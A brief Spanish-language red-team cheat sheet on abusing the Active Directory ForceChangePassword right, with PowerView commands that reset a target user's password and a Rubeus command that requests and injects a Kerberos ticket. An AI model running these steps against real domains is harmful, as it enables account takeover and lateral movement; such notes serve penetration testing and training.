# Abuso ACL 

Tags: #AD #ACL #Windows 

Permiso que permite **cambiar la contraseña de un usuario sin saber la contraseña actual**. 

## ForceChangePassword sobre Usuario 

### PowerView 
```powershell 
# Crear la variable de contraseña segura 
❯ $UserPassword = ConvertTo-SecureString 'P@$$w0rd123!' -AsPlainText -Force

# Cambiar la password
❯ Set-DomainUserPassword -Identity "TargetUser" -AccountPassword $UserPassword -Domain domain.corp
```

```powershell
# Solicitar un TGT con la nueva password 
❯ .\Rubeus.exe asktgt /user:TargetUser /password:'P@$$w0rd123!' /domain:domain.corp /ptt
```